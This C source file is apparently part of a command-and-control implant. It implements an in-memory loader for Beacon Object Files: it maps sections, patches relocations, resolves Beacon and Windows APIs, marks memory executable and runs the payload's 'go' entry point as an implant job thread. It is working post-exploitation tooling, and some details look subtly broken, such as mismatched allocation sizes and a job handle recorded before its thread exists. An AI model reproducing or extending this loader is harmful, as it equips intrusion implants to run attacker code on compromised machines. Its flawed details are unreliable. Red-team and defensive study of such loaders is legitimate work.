#include "Coff.h"

#include "Implant.h"

#include <stdio.h>

static PVOID GetSymbolAddress(
    CHAR *SymName
);
static DWORD GetSectionProtection(
    DWORD Characteristics
);

BOOL COFFCleanup(
    COFF_CONTEXT *Ctx
) {
    if (Ctx->SectionBuffer) {
        
        for (int i = 0; i < Ctx->FileHeader->NumberOfSections; i++) {
            if (Ctx->SectionBuffer[i])
            VirtualFree(Ctx->SectionBuffer[i], Ctx->SectionHeader[i].SizeOfRawData, MEM_RELEASE);
        }
        
        HeapFree(GetProcessHeap(), 0, Ctx->SectionBuffer);
    }

    if (Ctx->GlobalOffsetTable)
        VirtualFree(Ctx->GlobalOffsetTable, Ctx->FileHeader->NumberOfSymbols * sizeof(PVOID), MEM_RELEASE);

    HeapFree(GetProcessHeap(), 0, Ctx);
    return TRUE;
}

DWORD COFFRoutine(
    COFF_ENTRYPOINT_DATA* Args
) {
    Args->Entrypoint(Args->ArgsData, Args->ArgsSize);

    COFFCleanup(Args->Context);
    HeapFree(GetProcessHeap(), 0, Args);

    return 0;
}

BOOL COFFRun(
    COFF_CONTEXT*   Ctx,
    BOOL            Sync,
    PVOID           ArgsData,
    DWORD           ArgsSize
) {
    COFF_ENTRYPOINT         entry       = NULL;
    COFF_ENTRYPOINT_DATA*   data        = NULL;
    HANDLE                  hThread     = NULL;
    PJOB                    Job         = NULL;

    for (int i = 0; i < Ctx->FileHeader->NumberOfSymbols; i++) {
        if ( !strcmp( Ctx->SymbolTable[i].First.Name, "go" ) )
		{
            entry   = (COFF_ENTRYPOINT)((DWORD_PTR)Ctx->SectionBuffer[Ctx->SymbolTable[i].SectionNumber - 1] + Ctx->SymbolTable[i].Value);
            data    = (COFF_ENTRYPOINT_DATA*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COFF_ENTRYPOINT_DATA));
            if (!data) {
                return FALSE;
            }
            
            data->ArgsData      = ArgsData;
            data->ArgsSize      = ArgsSize;
            data->Context       = Ctx;
            data->Entrypoint    = entry;

            if (Sync) {
                COFFRoutine(data);
                return TRUE;
            } else {
                Job    = (JOB*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(JOB));
                if (!Job) {
                    return FALSE;
                }

                Job->ID         = RandomUint32();
                Job->hProcess   = hThread;
                Job->Status     = TRUE;
                Job->Type       = JOB_TYPE_THREAD;
                
                InsertTailList(&g_Implant.JobList, &Job->ListEntry);

                hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)COFFRoutine, data, 0, NULL);
                if (!hThread) {
                    return FALSE;
                }

                return TRUE;
            }

			return TRUE;
		}
    }

    return FALSE;
}

static BOOL COFFProcessRelocations(
    COFF_CONTEXT*           Ctx, 
    DWORD                   SectionIndex,
    PCOFF_SECTION_HEADER    SectionHeader,
    PCOFF_RELOCATION        RelocationHeaders
) {
    PVOID                   SymAddress = NULL;
    PCHAR                   SymName    = NULL;
    DWORD                   Offset     = 0;
    PCOFF_RELOCATION        Relocation = NULL;

    for (DWORD RelocationIndex = 0; RelocationIndex < SectionHeader->NumberOfRelocations; RelocationIndex++)
    {
        Relocation = RelocationHeaders + RelocationIndex;
        if (IS_SYMBOL_EXTERNAL(&Ctx->SymbolTable[Relocation->SymbolTableIndex])) {
            Offset      = Ctx->SymbolTable[Relocation->SymbolTableIndex].First.Value[1];
            SymName     = Ctx->StringTable + Offset + strlen("__imp_");
            SymAddress  = GetSymbolAddress(SymName);
            if (!SymAddress) {
                printf("[-] Failed to resolve symbol by name: %s\n", SymName);
                return FALSE;
            }

            Ctx->GlobalOffsetTable[Ctx->GlobalOffsetTableIndex]     = (DWORD_PTR)SymAddress;
            SymAddress                                              = Ctx->GlobalOffsetTable + Ctx->GlobalOffsetTableIndex;

            Ctx->GlobalOffsetTableIndex++;
        } else if (IS_SYMBOL_DEFINED(&Ctx->SymbolTable[Relocation->SymbolTableIndex])) {
            SymAddress = Ctx->SectionBuffer[Ctx->SymbolTable[Relocation->SymbolTableIndex].SectionNumber - 1];
            SymAddress = (PVOID)((DWORD_PTR)SymAddress + Ctx->SymbolTable[Relocation->SymbolTableIndex].Value);            
        } else {
            printf("[-] Relocation %d in section %d references undefined symbol %s\n", SectionIndex, RelocationIndex, SymName);
            return FALSE;
        }

        for(DWORD Index = 0; Index < 8; Index++) {
            if (COFFRelocationHandlers[Index].Type == Relocation->Type) {
                if (!COFFRelocationHandlers[Index].Handler(Ctx, SectionIndex, Relocation, SymAddress)) {
                    printf("[+] Failed to fix relocation\n");
                
                    return FALSE;
                }
                break;
            }
        }
    }

    return TRUE;
}

static BOOL COFFProcessSections(
    COFF_CONTEXT* Ctx
) {
    PCOFF_SECTION_HEADER    SectionHeader           = NULL;
    PCOFF_RELOCATION        SectionRelocations      = NULL;
    DWORD                   OldProtection           = 0;

    for (int i = 0 ; i < Ctx->FileHeader->NumberOfSections; i++)
    {
        SectionHeader       = Ctx->SectionHeader + i;
        SectionRelocations  = (PCOFF_RELOCATION)(Ctx->FileBuffer + SectionHeader->PointerToRelocations);
        if (!COFFProcessRelocations(Ctx, i, SectionHeader, SectionRelocations)) {
            return FALSE;
        }

        if (Ctx->SectionBuffer[i] == NULL) {
            continue;
        }

        if (!VirtualProtect(Ctx->SectionBuffer[i], SectionHeader->SizeOfRawData, GetSectionProtection(SectionHeader->Characteristics), &OldProtection)) {
            printf("VirtualProtect failed: ( %d )\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}

static BOOL COFFLoadSections(
    COFF_CONTEXT* Ctx
) {
    PCOFF_SECTION_HEADER    SectionHeader = NULL;
    PVOID                   SectionBuffer = NULL;

    for (int i = 0 ; i < Ctx->FileHeader->NumberOfSections; i++)
    {
        SectionBuffer = NULL;
        SectionHeader = Ctx->SectionHeader + i;
        if (!SectionHeader->SizeOfRawData) {
            Ctx->SectionBuffer[i] = NULL;
            continue;    
        }

        SectionBuffer = VirtualAlloc(NULL, SectionHeader->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);    
        if (!SectionBuffer) {
            printf("VirtualAlloc failed: ( %d )\n", GetLastError());
            return FALSE;
        }

        memcpy(
            SectionBuffer, 
            Ctx->FileBuffer + SectionHeader->PointerToRawData,
            SectionHeader->SizeOfRawData
        );
        
        Ctx->SectionBuffer[i] = SectionBuffer;
    }

    // printf("[+] COFF sections loaded\n");
    return TRUE;
}

static BOOL COFFInitialize(
    COFF_CONTEXT **Ctx,
    PVOID Data,
    DWORD Size
) {
    COFF_CONTEXT*   Context                 = NULL;
    PVOID           GlobalOffsetTable       = NULL;
    BOOL            Status                  = FALSE;
    DWORD           GlobalOffsetTableSize   = 0;
    PVOID*          SectionBuffer           = NULL;


    Context = (COFF_CONTEXT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COFF_CONTEXT));
    if (!Context) {
        printf("HeapAlloc failed: ( %d )\n", GetLastError());
        goto FAILED;
    }

    Context->FileBuffer     = (PBYTE)Data;
    Context->FileSize       = Size;
    Context->FileHeader     = (PCOFF_FILE_HEADER)Data;
    Context->SectionHeader  = (PCOFF_SECTION_HEADER)((PBYTE)Data + sizeof(COFF_FILE_HEADER));
    Context->SymbolTable    = (PCOFF_SYMBOL)((PBYTE)Data + Context->FileHeader->PointerToSymbolTable);
    Context->StringTable    = (CHAR*)(Context->SymbolTable + Context->FileHeader->NumberOfSymbols);

    SectionBuffer  = (PVOID*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PVOID) * Context->FileHeader->NumberOfSections);
    if (!SectionBuffer) {
        printf("HeapAlloc failed: ( %d )\n", GetLastError());
        goto FAILED;
    }

    GlobalOffsetTableSize   = sizeof(DWORD) * Context->FileHeader->NumberOfSymbols;
    GlobalOffsetTable       = VirtualAlloc(NULL, GlobalOffsetTableSize, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE);
    if (!GlobalOffsetTable) {
        printf("VirtualAlloc failed: ( %d )\n", GetLastError());
        goto FAILED;
    }

    Context->SectionBuffer          = SectionBuffer;
    Context->GlobalOffsetTable      = (DWORD_PTR*)GlobalOffsetTable;
    Context->GlobalOffsetTableIndex = 0;
    
    *Ctx = Context;

    return TRUE;

FAILED:
    if (Context)
        HeapFree(GetProcessHeap(), 0, Context);
    
    if (GlobalOffsetTableSize && GlobalOffsetTable)
        VirtualFree(GlobalOffsetTable, GlobalOffsetTableSize, MEM_RELEASE);
    
    if (SectionBuffer) 
        HeapFree(GetProcessHeap(), 0, SectionBuffer);

    return FALSE;
}

BOOL COFFLoader(
    BOOL            Sync,
    PVOID           FileData,
    DWORD           FileSize,
    PVOID           ArgsData,
    DWORD           ArgsSize
) {
    COFF_CONTEXT*   Ctx = NULL;

    if (!COFFInitialize(&Ctx, FileData, FileSize)) {
        printf("[-] Failed to parse COFF file\n");
        return FALSE;
    }

    // printf("[*] Loading COFF sections\n");

    if (!COFFLoadSections(Ctx)) {
        printf("[-] Failed to copy COFF sections\n");
        return FALSE;
    }

    // printf("[*] Processing COFF sections\n");

    if (!COFFProcessSections(Ctx)) {
        printf("[-] Failed to process COFF sections\n");
        return FALSE;
    }

    // run COFF
    if (!COFFRun(Ctx, Sync, ArgsData, ArgsSize)) {
        printf("[-] Failed to run COFF\n");
        return FALSE;
    }
    
    // COFFCleanup(Ctx);

    return TRUE;
}

/*
  --> @Cracked5pider
    - https://github.com/Cracked5pider/KaynLdr/blob/main/KaynLdr/src/KaynLdr.c#L79
*/
static DWORD GetSectionProtection(
    DWORD Characteristics
) {
    DWORD Protection = 0;

    if ( Characteristics & IMAGE_SCN_MEM_WRITE )
        Protection = PAGE_WRITECOPY;
    if ( Characteristics & IMAGE_SCN_MEM_READ )
        Protection = PAGE_READONLY;
    if ( ( Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Characteristics & IMAGE_SCN_MEM_READ ) )
        Protection = PAGE_READWRITE;
    if ( Characteristics & IMAGE_SCN_MEM_EXECUTE )
        Protection = PAGE_EXECUTE;
    if ( ( Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Characteristics & IMAGE_SCN_MEM_WRITE ) )
        Protection = PAGE_EXECUTE_WRITECOPY;
    if ( ( Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Characteristics & IMAGE_SCN_MEM_READ ) )
        Protection = PAGE_EXECUTE_READ;
    if ( ( Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Characteristics & IMAGE_SCN_MEM_READ ) )
        Protection = PAGE_EXECUTE_READWRITE;


    return Protection;
}

static PVOID GetSymbolAddress(
    CHAR *SymName
) {
    if (!strncmp(SymName, "Beacon", 6)
        || !strcmp(SymName, "toWideChar")
        || !strcmp(SymName, "GetProcAddress")
        || !strcmp(SymName, "GetModuleHandleA")
        || !strcmp(SymName, "LoadLibraryA")
        || !strcmp(SymName, "FreeLibrary")) {

        for ( DWORD i = 0; i < 29; i++ )
        {
            if ( !strcmp(InternalFunctions[i].Name, SymName) ) {
                return InternalFunctions[i].Address;
            }
        }

    } else {
        CHAR* Library  = strtok(SymName, "$");
        CHAR* Export   = SymName + strlen(Library) + 1;
        
        return (PVOID)GetProcAddress(LoadLibraryA(Library), Export);
    }
    
    return NULL;
}